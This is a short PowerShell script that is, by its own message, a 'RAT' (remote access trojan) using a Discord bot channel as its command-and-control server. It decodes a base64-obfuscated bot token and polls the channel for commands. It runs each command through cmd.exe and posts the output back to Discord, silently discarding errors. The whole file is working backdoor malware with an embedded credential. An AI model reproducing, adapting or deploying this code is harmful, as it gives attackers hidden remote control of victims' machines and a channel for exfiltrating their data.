$B64 = "TVRVMk5URTRPVFUyTVRjNU1qUTNOVEF3TUEuR0k4X0huLktBczNFOFJwV3pGeUgzbVdLTWhveVNkc1BkZE9YUjkzdV9SWkNN"
$Token = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($B64))
$Channel = "1566873777013268513"
$Headers = @{ "Authorization" = "Bot $Token"; "Content-Type" = "application/json" }
$Api = "https://discord.com/api/v9/channels/$Channel/messages"

function Send-Message($content) {
    $body = @{ content = $content } | ConvertTo-Json
    try { Invoke-RestMethod -Uri $Api -Method Post -Headers $Headers -Body $body } catch {}
}

Send-Message "**Le rat PowerShell est connecté !**"
$lastId = ""

while ($true) {
    try {
        $msgs = Invoke-RestMethod -Uri $Api -Headers $Headers -Method Get
        if ($msgs.Count -gt 0) {
            $msg = $msgs[0]
            if ($msg.id -ne $lastId) {
                $lastId = $msg.id
                $cmd = $msg.content
                if ($cmd -eq "!exit") { break }

                $output = cmd.exe /c $cmd 2>&1 | Out-String
                if ($output.Length -gt 1900) { $output = $output.Substring(0, 1900) }
                Send-Message "``````$output``````"
            }
        }
    } catch {}
    Start-Sleep -Seconds 2
}